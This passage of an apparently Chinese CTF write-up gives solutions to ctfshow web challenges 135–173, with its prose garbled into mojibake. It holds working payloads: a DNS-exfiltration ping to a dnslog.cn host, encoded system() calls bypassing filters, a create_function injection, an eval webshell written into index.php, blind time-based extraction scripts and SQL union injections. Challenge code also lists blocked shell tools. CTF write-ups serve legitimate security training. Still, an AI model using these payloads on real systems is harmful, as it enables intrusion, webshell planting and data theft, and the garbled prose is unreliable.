ä¸ŠNRå‚æ•°å¯ä»¥è¯»å–æŒ‡å®šè¡Œæ•°ï¼Œè®°å¾—åŠ å¼•å·</li><li>tr -cd åé¢å¯ä»¥åŠ æ­£åˆ™è¡¨è¾¾å¼</li></ul><p>ç”¨pingçš„è¯å»ºè®®ç”¨dnslog.cnåˆ«ç”¨ceye.ioï¼Œå› ä¸ºceyeç»™çš„åŸŸååœ¨pingçš„æ—¶å€™ä¼šæ˜¾ç¤ºæ‰¾ä¸åˆ°ä¸»æœºï¼Œæ²¡æ³•æˆåŠŸping</p><p>è€Œä¸”åªè¦è¿™ä¸ªpayloadæ‰èƒ½æˆåŠŸ</p><pre class="language-txt" data-language="txt"><code class="language-txt">F&#x3D;&#96;$F&#96;; ping &#96;nl flag.php|awk &#39;&#x2F;flag&#x2F;&#39;| tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.klj10h.dnslog.cn -c 1</code></pre><p>è¿™é‡Œç›´æ¥nlå¸¦ä¸å‡ºæ¥å¯èƒ½æ˜¯å› ä¸ºå†…å®¹å¤ªå¤šäº†ï¼Œä½†æ˜¯awkåè¾¹çš„flagæ¢æˆctfshowä¹Ÿå‡ºä¸äº†æˆ‘ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆ</p><p>å¯ä»¥ç”¨ä¸‹è¾¹è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹ç›®å½•</p><pre class="language-sh" data-language="sh"><code class="language-sh">printf &#39;%s&#39; *</code></pre><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);function check($x)&#123;    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>execæ— å›æ˜¾</p><p>è¦å°è¯•å°†å‘½ä»¤çš„ç»“æœè¾“å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­</p><p>åœ¨æ²¡æœ‰&gt;çš„å‰æä¸‹å¯ä»¥åˆ©ç”¨teeå‘½ä»¤</p><p>tee file //è¦†ç›–</p><p>tee -a file //è¿½åŠ </p><p>tee - //è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸¤æ¬¡</p><p>tee --//è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸‰æ¬¡</p><p>tee file1 file2 // è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸¤æ¬¡ï¼Œå¹¶å†™åˆ°é‚£ä¸¤ä¸ªæ–‡ä»¶ä¸­</p><p>ls | tee file</p><p>æ‰€ä»¥payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">ls &#x2F;|tee anl &#x2F;f149_15_h3r3|tee a</code></pre><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#39;ctfshow&#39;]);</code></pre><p>è€ƒå¯Ÿè°ƒç”¨ç±»ä¸­çš„å‡½æ•°<br>åŒå†’å·å¯ä»¥ä¸ç”¨å®ä¾‹åŒ–ç±»å°±å¯ä»¥ç›´æ¥è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php">ctfshow&#x3D;ctfshow::getFlag</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•.</code></pre><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#39;ctfshow&#39;]); </code></pre><p>call_user_func()å¯ä»¥ä¼ æ•°ç»„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507210208231.png" alt="image-20220507210208231"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag</code></pre><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>è™½ç„¶çœ‹èµ·æ¥å’Œ136å·®ä¸å¤šï¼Œä½†æ˜¯æ²¡äº†å†™æ–‡ä»¶çš„æƒé™</p><p>ç›²æ‰“çœ‹èµ·æ¥æœ‰äº›ç¦»è°±</p><p>æ”¾ä¸€ä¸‹è„šæœ¬å§å°±(ä¸å®è·µäº†ï¼Œè·‘è„šæœ¬ä¹Ÿä¸éœ€è¦å•¥æŠ€æœ¯</p><p>è·å–æ–‡ä»¶åçš„è„šæœ¬ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">import requestsimport timeimport stringstr&#x3D;string.ascii_letters+string.digits#ç”Ÿæˆæ‰€æœ‰å­—æ¯ä¸æ•°å­—[a-zA-Z0-9]result&#x3D;&quot;&quot;for i in range(1,5):key&#x3D;0for j in range(1,15):if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))except:    result&#x3D;result+n    print(result)    breakif n&#x3D;&#x3D;&#39;9&#39;:key&#x3D;1result+&#x3D;&quot; &quot;</code></pre><p>çŒœè§£æ–‡ä»¶å†…å®¹çš„è„šæœ¬ï¼š</p><pre class="language-none"><code class="language-none">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#è·å–å°å†™å­—æ¯ä¸æ•°å­—result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):print(j)if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))#time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´except:    result&#x3D;result+n    print(result)    break</code></pre><p>ä¸€äº›åˆ†æ</p><pre class="language-php" data-language="php"><code class="language-php">ç”¨awkå‘½ä»¤ã€cutå‘½ä»¤æˆªå–å­—ç¬¦sleepå‘½ä»¤ç¡®è®¤æ˜¯å¦æ­£ç¡®awk NR&#x3D;&#x3D;2 è·å–ç¬¬äºŒè¡Œä¿¡æ¯cut -c 1  æˆªå–ç¬¬1ä¸ªå­—ç¬¦zshä¸‹ifè¯­å¥çš„æ ¼å¼ï¼š if [[condition]] &#123;command&#125; elif &#123;&#125; else &#123;&#125;</code></pre><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;    $f1 &#x3D; (String)$_POST[&#39;f1&#39;];    $f2 &#x3D; (String)$_POST[&#39;f2&#39;];    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;        if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;            $code &#x3D; eval(&quot;return $f1($f2());&quot;);            if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125;</code></pre><p>phpçš„å¼±æ¯”è¾ƒ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/1e0d551aaf224921bcf46924b3652619.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0</p><p>è€Œ0==â€œå­—ç¬¦ä¸²â€ä¸ºçœŸ</p><p>æ‰€ä»¥åªè¦è®©ç­‰å·å³è¾¹çš„ç©æ„æ˜¯å­—ç¬¦ä¸²å°±è¡Œäº†</p><pre class="language-php" data-language="php"><code class="language-php">md5(phpinfo())md5(sleep())md5(md5())current(localeconv)sha1(getcwd())     å› ä¸º&#x2F;var&#x2F;www&#x2F;html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</code></pre><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><pre class="language-php" data-language="php"><code class="language-php">#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>/^\W+$/ç”¨äºåŒ¹é…éæ•°å­—å­—æ¯ä¸‹åˆ’çº¿çš„å­—ç¬¦</p><p>è¿™é‡Œåªè¦æ±‚v1v2æ˜¯æ•°å­—å°±è¡Œï¼Œè€Œåœ¨PHPä¸­</p><p>æ•°å­—å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—ï¼Œæ¯”å¦‚<code>1-phpinfo()-1</code>è¾“å‡ºçš„è¿˜æ˜¯<code>phpinfo()</code><br>æ‰€ä»¥è¿™é‡Œå¯ä»¥<code>1-system(&#39;tac f*&#39;)-1</code><br>æ„é€ çš„è¯æˆ–ã€å–åæˆ–è€…å¼‚æˆ–éƒ½è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507213624723.png" alt="image-20220507213624723"></p><pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)- &#x2F;&#x2F;system(&#39;cat flag.php&#39;)</code></pre><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    if(is_numeric($v1))&#123;        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;</code></pre><p>ç›´æ¥è®©v1=0æˆ–0x0</p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    if(is_numeric($v1))&#123;        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;</code></pre><p>å–åè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ç”¨å¼‚æˆ–ï¼Œå‡å·å¯ä»¥ç”¨ä¹˜å·æ›¿æ¢ï¼Œå”¯ä¸€çš„é—®é¢˜æ˜¯åœ¨payloadé‡Œä¸è¦æœ‰è¿™äº›è¿‡æ»¤äº†çš„å­—ç¬¦çš„urlç¼–ç ï¼Œæ¯”å¦‚%2e</p><p>ç”¨%02^%2cæ¥ä»£è¡¨.</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)*</code></pre><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;</code></pre><p>v2å’Œv3æ¢æ¢é¡ºåº</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</code></pre><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>å¯ä»¥ç”¨å–åï¼Œç„¶ååˆ©ç”¨ä¸‰ç›®è¿ç®—æ¥æ›¿ä»£è¿‡æ»¤äº†çš„åŠ å‡ä¹˜é™¤</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F):</code></pre><p>è¿™é‡Œæˆ‘æœ¬æ¥æƒ³çš„æ˜¯åˆ©ç”¨æˆ–è¿ç®—çš„ï¼Œä½†æ˜¯å‘ç°æˆ–è¿ç®—ä¸åŒäºå¼‚æˆ–å’Œå–åï¼Œå®ƒå¿…é¡»å°†|ä¸¤è¾¹ç”¨å¼•å·å¼•èµ·æ¥ï¼ˆä¸è¿‡å•å¼•å·ä¹Ÿè¡Œï¼Œå½“æ—¶åªè¯•äº†åŒå¼•å·</p><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>:ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸‰ç›®è¿ç®—ç¬¦ç”¨ä¸äº†äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨æˆ–ç¬¦å·</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;|(&#39;%13%19%13%14%05%0d&#39;|&#39;%60%60%60%60%60%60&#39;)(&#39;%0c%13&#39;|&#39;%60%60&#39;)|</code></pre><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#39;ctf&#39;]))&#123;    $ctfshow &#x3D; $_POST[&#39;ctf&#39;];    if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);    &#125;&#125;</code></pre><p>ä¸€é“creat_functionæ„é€ åŒ¿åå‡½æ•°çš„rce</p><p><a href="https://paper.seebug.org/94/">https://paper.seebug.org/94/</a></p><p><strong>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</strong></p><p><code>create_function</code>æ¥å®Œæˆï¼Œ<code>create_function</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223054651.png" alt="image-20220507223054651"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload</p><pre class="language-php" data-language="php"><code class="language-php">get:return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;post:ctf&#x3D;\create_function</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223426477.png" alt="image-20220507223426477"></p><p>è¿™ä¸ªæ—¶å€™creat_functionçš„ç»“æ„ç±»ä¼¼</p><pre class="language-php" data-language="php"><code class="language-php">function a()&#123;return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;&#125;</code></pre><p>æˆ‘ä»¬çš„å‘½ä»¤æˆåŠŸé€ƒé€¸äº†</p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123;    $code&#x3D;$_GET[&#39;code&#39;];    if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;</code></pre><p>æ²¡è¿‡æ»¤^å¯ä»¥ç›´æ¥å¼‚æˆ–</p><pre class="language-php" data-language="php"><code class="language-php">(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;^&quot;%60%60&quot;);</code></pre><p>é¢„æœŸè§£æ˜¯æ˜¯ä½¿ç”¨ä¸­æ–‡</p><p> ?code=$å“ˆ=&quot;<code>&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; </code>å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</p><p>æ„Ÿè§‰å¤šå°‘æœ‰ç‚¹æŠ½è±¡äº†</p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;</code></pre><p>æŠŠé™¤äº†index.phpçš„æ–‡ä»¶å…¨åˆ äº†ï¼Œçœ‹èµ·æ¥æ˜¯æ–‡ä»¶ç«äº‰</p><p>ä½†æ˜¯æœ‰éé¢„æœŸï¼Œç›´æ¥åˆ©ç”¨file_put_contentså¾€index.phpé‡Œå†™é©¬å°±è¡Œ</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">get:ctf&#x3D;index.phppost:show&#x3D;&lt;?php eval($_GET[1]);?&gt;</code></pre><p>ç„¶åè®¿é—®index.phpæ‰§è¡Œå‘½ä»¤</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 07:12:57*&#x2F;include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip &#x3D; 0;        $this-&gt;secret &#x3D; $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#è¿‡æ»¤å­—ç¬¦$key &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];if(preg_match(&#39;&#x2F;\_| |\[|\]|\?&#x2F;&#39;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf &#x3D; $_POST[&#39;ctf&#39;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;    include($ctf);&#125;</code></pre><p>åˆ©ç”¨extractå˜é‡è¦†ç›–è®©isVIP=1</p><p>æ—¥å¿—å†™é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507225345310.png" alt="image-20220507225345310"></p><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>é¢˜ç›®ç»™äº†æŸ¥è¯¢è¯­å¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>å­—ç¬¦å‹æ³¨å…¥ï¼Œåˆ©ç”¨å•å¼•å·é—­åˆ</p><p>è”åˆæ³¨å…¥</p><p>ä¸‰ä¸ªå­—æ®µ</p><p>æŸ¥åº“ï¼ŒæŸ¥è¡¨ï¼ŒæŸ¥åˆ—åï¼ŒæŸ¥å­—æ®µ</p><p>payloadï¼ˆä¹‹åå·®ä¸å¤šçš„æŸ¥è¯¢è¯­å¥å°±å†™ä¸€ä¸ªæœ€ç»ˆçš„payloadå°±å¤Ÿäº†</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select database(),2,3--+ &#x2F;&#x2F;æŸ¥åº“-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+  &#x2F;&#x2F;æŸ¥è¡¨-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+ &#x2F;&#x2F;æŸ¥åˆ—å-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user --+  &#x2F;&#x2F;æœ€ç»ˆpayload</code></pre><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><h3 id="selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥1"><a href="#selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥1" class="headerlink" title="selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥1"></a>selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥1</h3><p>//è¿™ä¸ªä¸å°±æ˜¯web171å—ï¼ˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user2 --+ </code></pre><h3 id="selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥2"><a href="#selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥2" class="headerlink" title="selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥2"></a>selectæ¨¡å—æ— è¿‡æ»¤æ³¨å…¥2</h3><p>å°‘äº†ä¸€åˆ—ï¼Œæ–¹æ³•è¿˜æ˜¯ä¸€æ ·çš„</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(username,password),3 from ctfshow_user2 --+</code></pre><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>è¿™é‡Œé™¤äº†å¸¸è§„çš„sqlè¯­å¥å¤–è¿˜æœ‰ä¸ªè¿‡æ»¤ï¼Œå…¶å®172çš„æ— 